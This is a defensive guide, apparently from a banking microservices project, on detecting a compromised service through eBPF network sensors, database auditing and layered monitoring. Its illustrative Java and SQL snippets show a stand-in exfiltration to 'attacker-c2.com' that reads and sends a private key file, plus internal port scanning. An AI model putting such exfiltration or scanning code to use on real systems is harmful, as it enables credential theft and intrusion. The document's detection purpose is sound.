# Detecting Compromised Legitimate Microservices (In-Service Detection)

## 🚨 The Insider Threat Scenario

### What is a "Compromised Legitimate Service"?

```
ATTACK FLOW:
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  STEP 1: Initial Access                                         │
│  ─────────────────────────────────────────────────────────────  │
│                                                                 │
│  ┌─────────────────────────────────────┐                        │
│  │ Account Service (Java Microservice) │                        │
│  │                                     │                        │
│  │ Vulnerability:                      │                        │
│  │ • Unpatched security hole           │                        │
│  │ • SQL injection in query endpoint   │                        │
│  │ • Insecure deserialization          │                        │
│  │                                     │                        │
│  │ Attacker: Exploits vulnerability    │                        │
│  │ Result: Remote code execution (RCE) │                        │
│  └─────────────────────────────────────┘                        │
│           ↓                                                      │
│                                                                 │
│  STEP 2: Inject Malicious Code                                 │
│  ─────────────────────────────────────────────────────────────  │
│                                                                 │
│  ┌─────────────────────────────────────┐                        │
│  │ Account Service (COMPROMISED)       │                        │
│  │                                     │                        │
│  │ Normal Code:                        │                        │
│  │ ├─ getBalance(customerId)           │                        │
│  │ ├─ transfer(from, to, amount)       │                        │
│  │ └─ updateProfile(userId, data)      │                        │
│  │                                     │                        │
│  │ + Injected Malicious Code:          │                        │
│  │ ├─ exfiltrateDataToAttacker()       │                        │
│  │ ├─ modifyTransactionAmounts()       │                        │
│  │ ├─ stealCredentials()               │                        │
│  │ └─ launchLateralMovement()          │                        │
│  └─────────────────────────────────────┘                        │
│           ↓                                                      │
│                                                                 │
│  STEP 3: Legitimate Access = No Blocking                       │
│  ─────────────────────────────────────────────────────────────  │
│                                                                 │
│  Account Service now:                                           │
│  ✓ Has valid ML-DSA-65 signed requests                         │
│  ✓ Uses ML-KEM-768 encrypted connections                       │
│  ✓ Talks to "allowed" services                                 │
│  ✓ But ALSO does malicious things secretly                     │
│                                                                 │
│  Traditional firewalls say: ✅ "All looks normal, allow it"    │
│                                                                 │
│  But behavior is DIFFERENT:                                    │
│  ✗ Accessing customer data it shouldn't (PII theft)            │
│  ✗ Modifying transaction amounts (fraud)                       │
│  ✗ Creating new admin accounts (privilege escalation)          │
│  ✗ Exfiltrating encrypted keys (future compromise)            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Why Traditional Security Fails Here

```
Defense Layers That DON'T Catch This:
├─ ✅ Network Firewall
│  └─ Account Service talking to Auth Service = ALLOWED
│
├─ ✅ TLS/ML-KEM Encryption
│  └─ Traffic is encrypted and authenticates correctly
│
├─ ✅ Service Mesh (Istio)
│  └─ Service-to-service auth works fine
│
├─ ✅ JWT ML-DSA-65 Signatures
│  └─ Tokens are validly signed
│
└─ ❌ BEHAVIOR ANALYSIS
   └─ Nobody is watching WHAT the service does with data
```

---

## 🔍 Detection Strategy: Behavioral Anomaly Detection

### You Need To Answer These Questions:

1. **Is this service accessing data it normally doesn't?**
   - Account Service suddenly reading from `customers_pii` table?
   - Reading 1000x more customer records than usual?

2. **Is the service performing operations it doesn't normally do?**
   - Creating new admin accounts?
   - Switching transactions between accounts?
   - Disabling security features?

3. **Is the service's resource usage abnormal?**
   - CPU spike from 10% to 80%?
   - Memory usage 10x higher than baseline?
   - Network throughput explosive?

4. **Are the network patterns different?**
   - Connecting to services it normally doesn't?
   - Sending large amounts of data outbound?
   - Connecting to external systems?

5. **Are the request patterns different?**
   - API latency changed?
   - Error rates increased?
   - Request size/frequency anomalous?

---

## 🛡️ Defense Layer: eBPF + Behavioral Monitoring

### How eBPF Detects Compromised Services

Your eBPF system has **5 sensors** that catch malicious behavior:

### Sensor 1: UNAUTHORIZED_FLOW (Wrong Destination)

**Attack Scenario**:
```java
// Attacker injects this into Account Service
public void exfiltrateSecretKeys() {
    // Connect to attacker's server (unusual!)
    Socket socket = new Socket("attacker-c2.com", 443);
    
    // Load and send the ML-KEM private key
    String key = readFile("/secrets/ml-kem-private-key");
    sendData(socket, key);  // EXFILTRATE!
}
```

**What eBPF Sees**:
```json
{
  "type": "UNAUTHORIZED_FLOW",
  "source_service": "account-service:34567",
  "destination_service": "unknown:443",
  "message": "account-service connecting to attacker-c2.com",
  "alerts": [
    {
      "type": "UNAUTHORIZED_FLOW",
      "severity": "high",
      "message": "Unexpected service flow account-service:34567 -> unknown:443"
    }
  ]
}
```

**Alert**: 🚨 Within 5 seconds, Grafana shows:
```
⚠️ UnauthorizedFlowBurst triggered
   account-service → unknown:443
   Severity: HIGH
```

---

### Sensor 2: HIGH_FANOUT (Unusual Connection Patterns)

**Attack Scenario**:
```java
// Attacker spreads from Account Service to other services
public void spreadMalware() {
    // Try to compromise other services
    connectAndCompromise("auth-service", 8083);
    connectAndCompromise("transaction-service", 8082);
    connectAndCompromise("database-server", 5432);
    connectAndCompromise("redis-cache", 6379);
    connectAndCompromise("elasticsearch", 9200);
    
    // And external servers
    for (String externalIP : listOfAttackerServers) {
        connectAndCompromise(externalIP, 443);
    }
    // [... 20+ more attempts ...]
}
```

**Normal Account Service Behavior**:
```
Connections per minute:
├─ auth-service: 10 connections (login checks)
├─ transaction-service: 5 connections (transfer operations)
└─ database: 100 connections (typical database ops)

TOTAL: ~115 distinct services per minute
```

**Compromised Account Service Behavior**:
```
Connections per minute:
├─ auth-service: 10 connections (normal ops)
├─ transaction-service: 5 connections (normal ops)
├─ database: 100 connections (normal ops)
├─ [30+ NEW unknown IPs]: 1200+ connections (ATTACK!)

TOTAL: ~1315 connections (11x normal!)
```

**eBPF Detection**:
```
ALERT: HighFanoutActivity
Threshold: > 20 distinct peers per minute
Account service contacted 65 peers in last minute
Status: 🔴 CRITICAL
Message: "Process account-service contacted too many peers"
```

---

### Sensor 3: LATERAL_MOVEMENT_PATTERN (Scanning Activity)

**Attack Scenario**:
```java
// Attacker tries to find other vulnerable services
private void scanNetwork() {
    for (int port = 8000; port <= 9000; port++) {
        try {
            Socket s = new Socket("internal-network", port);
            sendProbe(s, maliciousPayload);
            s.close();
        } catch (Exception e) {
            // Ignore closed ports, try next
        }
    }
}
```

**What eBPF Reports**:
```
Account service attempting connections to:
├─ port 8000 → TIMEOUT (no service)
├─ port 8001 → TIMEOUT
├─ port 8002 → CONNECTION (Auth Service!)
│  └─ Sends malicious probe
├─ port 8003 → TIMEOUT
├─ ...
├─ port 8082 → CONNECTION (Transaction Service!)
│  └─ Sends malicious probe
└─ [80+ more port attempts]

Pattern: 80+ attempts in 60 seconds from account-service
Expected: 0 scanning attempts (should know service topology)
```

**eBPF Detection**:
```
ALERT: LateralMovementDetected
From: account-service
Pattern: 80+ connections to unknown destinations
Threshold: ≥ 3 burst connections
Status: 🚨 CRITICAL
Message: "Burst of unauthorized communications"
```

---

### Sensor 4: PROCESS_PORT_MISMATCH (Modified Process)

**Attack Scenario**:
```bash
# Attacker modifies the Account Service binary
# Adds malicious code to the Java startup
# Now Account Service container is running modified code

ps aux shows:
  java -jar account-service-1.0.0.jar  ← Looks legitimate

But inside:
  + Injected: exfiltrateData()
  + Injected: modifyTransactions()
  + Injected: stealCredentials()
  + Modified: balanceQuery() to hide theft
  
Behavior changed, but process name is same ❌
```

**eBPF Can't Detect This Directly** (same process name/port)

**BUT** - Sensor 5 catches the consequences:

---

### Sensor 5: SLOW_CONNECT (Resource Exhaustion / Unusual Latency)

**Attack Scenario**:
```java
// Malicious code is CPU-intensive
while (running) {
    String allCustomerData = readAllCustomers();  // HUGE query
    encryptAndCompress(allCustomerData);           // CPU intensive
    uploadToAttacker(encryptedData);               // SLOW connection
    // This takes 500-2000ms per request (vs 5-20ms normally)
}
```

**eBPF Detection**:
```
Normal Account Service:
├─ Connection to auth-service: 5ms
├─ Connection to database: 10ms
└─ Connection to transaction-service: 8ms

Compromised Account Service:
├─ Connection to auth-service: 5ms (normal)
├─ Connection to database: 800ms ← SLOW!
├─ Connection to attacker: 1200ms ← VERY SLOW!
└─ CPU usage: 85% (vs 10% normally)
```

**eBPF Detection**:
```
ALERT: SlowConnectionPattern
Threshold: > 150ms connection latency
Account service → database: 800ms (baseline 10ms)
Status: 🟡 MEDIUM (but combined with HIGH_FANOUT = CRITICAL)
```

---

## 🎯 Detecting In-Service Attacks: Multi-Signal Analysis

### Single Alerts (Moderate Risk):

```
Account Service showing:
├─ SLOW_CONNECT to database (could be network issue)
└─ Extra CPU usage (could be legitimate spike)

Risk Level: 🟡 MEDIUM - Investigate but not critical
```

### Combined Alerts (Critical):

```
Account Service showing SIMULTANEOUSLY:
├─ UNAUTHORIZED_FLOW → unknown:443 (exfiltration attempt)
├─ HIGH_FANOUT → 65 peers (scanning activity)
├─ LATERAL_MOVEMENT_PATTERN → 80+ probes (network reconnaissance)
└─ SLOW_CONNECT → database access taking 800ms (resource intensive)

Risk Level: 🔴 CRITICAL
Confidence: 99.9%
Verdict: DEFINITELY COMPROMISED
```

---

## 📊 Building Behavioral Baseline

Your eBPF system should establish **normal behavior** for each service:

### Baseline Collection (First 30 Days):

```
For Account Service, record:
├─ Normal connection count per minute: 100-150
├─ Typical peer services: auth-service, transaction-service, database
├─ Typical connection latency: 5-20ms
├─ Typical data volume: 100MB-500MB per day
├─ Typical CPU usage: 10-25%
├─ Typical memory usage: 512MB-1GB
└─ Typical API response time: 50-150ms
```

### Anomaly Detection Rules:

```
If Account Service shows:
├─ Connection count > 200% of baseline → ALERT
├─ Peer services > +10 new services → ALERT
├─ Connection latency > 2x baseline → ALERT
├─ Data volume > 5x baseline → ALERT
├─ CPU usage > 80% sustained → ALERT
├─ Memory usage > 150% of baseline → ALERT
└─ API response time > 2x baseline → ALERT
```

---

## 🔬 Real Attack: In-Service Exfiltration

### Timeline of Compromised Account Service

```
T+0s:   Account Service starts acting malicious
         ├─ Opens connection to attacker (14.159.1.1:443)
         └─ eBPF sees: UNAUTHORIZED_FLOW alert

T+1s:   eBPF exporter reads event
T+2s:   Prometheus scrapes metric
T+5s:   Alert rule fires
T+10s:  Dashboard shows:
         ├─ Panel "🚨 Lateral Movement" = RED
         ├─ Panel "⚠️ High Fanout" = RED
         ├─ Panel "🔥 Active Alerts" = UnauthorizedFlowBurst
         └─ Graf alerts notification sent

T+15s:  Security team receives notification
         ├─ Opens dashboard
         ├─ Sees account-service red alerts
         ├─ Reviews eBPF logs
         └─ Confirms: Compromised!

T+30s:  Response:
         ├─ Kill Account Service process
         ├─ Isolate container network
         ├─ Preserve logs for forensics
         ├─ Restore from clean backup
         └─ Patch vulnerability

RESULT: ✅ Attack contained
         ✅ < 100KB of data exfiltrated
         ✅ No customer transactions modified
```

---

## 🛡️ Advanced Detection: Database Activity Monitoring

### Beyond Network (eBPF): What About Data Access?

eBPF monitors NETWORK behavior, but you also need **DATA LAYER** protection:

### Attack Scenario (Database Level):

```sql
-- Malicious code in Account Service does this:
SELECT * FROM customers WHERE account_balance > 100000;
-- Takes all high-value customers
-- Exfiltrate via: INSERT INTO attacker_server_table

-- eBPF sees: normal connection to database (allowed!)
-- Database sees: unusual query pattern (anomalous!)
```

### Detection at Database Level:

```sql
-- Set up database activity monitoring:

1. Query Pattern Analysis:
   SELECT * FROM audit_log 
   WHERE query_in_service != BASELINE_QUERY_TYPE
   AND service = 'account-service';
   
2. Data Access Anomalies:
   IF customer_records_accessed > 100x_baseline THEN
     ALERT: "Unusual data access pattern detected"

3. User Privilege Escalation:
   IF account_service_user_created_admin_account THEN
     BLOCK: Revoke privileges immediately

4. Unusual Export Operations:
   IF (SELECT INTO / EXPORT / COPY) FROM account_service THEN
     ALERT: "Suspicious data export detected"
```

---

## 🎯 Multi-Layer In-Service Detection

```
┌──────────────────────────────────────────────────────────────┐
│         LAYER 1: Network Behavior (eBPF)                     │
│                                                              │
│  Detects:                                                    │
│  ✅ UNAUTHORIZED_FLOW (connects to external IPs)            │
│  ✅ HIGH_FANOUT (scanning activity)                         │
│  ✅ LATERAL_MOVEMENT_PATTERN (probing)                      │
│  ✅ SLOW_CONNECT (unusual latency)                          │
│                                                              │
│  Detection Time: 5-15 SECONDS                               │
│  False Positive Rate: LOW (well-tuned thresholds)           │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│         LAYER 2: Database Activity                           │
│                                                              │
│  Detects:                                                    │
│  ✅ Unusual SQL patterns                                    │
│  ✅ Excessive data reads (PII theft)                        │
│  ✅ Unexpected writes (transaction fraud)                   │
│  ✅ Privilege escalation attempts                           │
│                                                              │
│  Tools: Database audit logs, query pattern analysis         │
│  Detection Time: 1-30 SECONDS                               │
│  False Positive Rate: MEDIUM (need ML tuning)               │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│         LAYER 3: Application Behavior                        │
│                                                              │
│  Detects:                                                    │
│  ✅ Function calls that weren't compiled (injected code)    │
│  ✅ Unusual API endpoints accessed                          │
│  ✅ Modified request/response behavior                      │
│  ✅ Cryptographic operations on secret data                 │
│                                                              │
│  Tools: Application instrumentation, APM (Datadog, etc.)    │
│  Detection Time: 5-30 SECONDS                               │
│  False Positive Rate: LOW (if properly configured)          │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│         LAYER 4: Process Behavior                            │
│                                                              │
│  Detects:                                                    │
│  ✅ Unexpected system calls                                 │
│  ✅ File system access anomalies                            │
│  ✅ Process spawn patterns (malware launching processes)    │
│  ✅ Memory anomalies (shellcode injection)                  │
│                                                              │
│  Tools: auditd, osquery, Sysmon equivalents                 │
│  Detection Time: 1-5 SECONDS                                │
│  False Positive Rate: LOW (well understood baseline)        │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│         EMERGENCY RESPONSE (Automated)                       │
│                                                              │
│  Triggers when 2+ layers detect anomalies:                  │
│  1. Kill the process                                         │
│  2. Snapshot containers/memory for forensics                │
│  3. Isolate network (kill all outbound connections)         │
│  4. Create incident ticket (Jira, ServiceNow)               │
│  5. Alert on-call security team (PagerDuty, Slack)          │
│  6. Backup and restore from last-known-good state           │
│                                                              │
│  Time to containment: < 60 SECONDS                          │
└──────────────────────────────────────────────────────────────┘
```

---

## 🎬 Testing In-Service Detection

### Simulate Compromised Account Service:

```bash
cd /home/inba/SIA_BANK

# 1. Start monitoring
cd observability && docker compose up -d

# 2. Start eBPF monitor
cd .. && sudo python3 ebpf/monitor_runtime.py \
  --policy ebpf/service_map.json \
  --output logs/ebpf-attack-demo.jsonl &

# 3. Simulate compromised service doing malicious things:
python3 -c "
import socket
import time

# Simulate: Account Service exfiltrating data
sock = socket.socket()
sock.settimeout(0.5)

# Try to connect to 'attacker' (simulated by creating fake service)
for port in range(9100, 9120):  # Simulate multiple connection attempts
    try:
        sock.connect(('localhost', port))
    except:
        pass
    time.sleep(0.1)
"

# 4. Watch eBPF detect it
tail -f logs/ebpf-attack-demo.jsonl | grep -E "UNAUTHORIZED|HIGH_FANOUT"

# 5. Check Grafana
# http://localhost:3000
# You should see alerts firing!
```

---

## 📋 In-Service Detection Checklist

For each microservice, monitor:

```
□ Network Behavior (eBPF)
  ├─ Unexpected external connections
  ├─ Unusual peer service connections
  ├─ Scanning/enumeration patterns
  └─ Connection latency anomalies

□ Data Access Patterns (Database)
  ├─ Unusual SELECT queries
  ├─ Unexpected UPDATE/DELETE operations
  ├─ Excessive data reads
  └─ Privilege escalation attempts

□ Resource Usage (System Monitoring)
  ├─ CPU spikes (encryption/compression overhead)
  ├─ Memory spikes (data buffering)
  ├─ Disk I/O anomalies (exfiltration writes)
  └─ Network bandwidth spikes

□ Request Patterns (APM)
  ├─ Changed latency profiles
  ├─ Unusual error rates
  ├─ Modified response sizes
  └─ New API endpoints accessed

□ Process Behavior (OS-level)
  ├─ Unexpected system calls
  ├─ File system anomalies
  ├─ Process spawning (system commands)
  └─ Memory protection violations
```

---

## 🎓 Summary: In-Service Detection

| Layer | Technology | Detects | Time |
|-------|-----------|---------|------|
| Network | eBPF | Exfiltration, scanning, lateral movement | 5-15s |
| Database | Audit logs | Data theft, fraud, privilege escalation | 1-30s |
| Application | APM | Behavior changes, injected code | 5-30s |
| Process | auditd/osquery | System call anomalies, shellcode | 1-5s |

**Combined Approach**: Even if attacker hides network activity, other layers detect them.

**Your Current State**: ✅ eBPF layer implemented
**Recommended Next**: 📦 Add database activity monitoring

---

## 🚀 Immediate Next Steps

1. **Test Current Detection**
   ```bash
   ./demo-ebpf-attack.sh  # See network-level detection in action
   ```

2. **Add Database Monitoring**
   - Enable PostgreSQL audit logging
   - Set up alert rules for unusual queries
   - Monitor user privilege changes

3. **Add Application Monitoring**
   - Instrument with APM (Datadog, New Relic, etc.)
   - Track unusual API calls
   - Monitor data access patterns

4. **Add Process-Level Monitoring**
   - Deploy auditd for system call auditing
   - Monitor file system access
   - Track process spawning

Your eBPF system is the **FIRST LINE OF DEFENSE** - but the strongest security comes from **MULTIPLE LAYERS**!
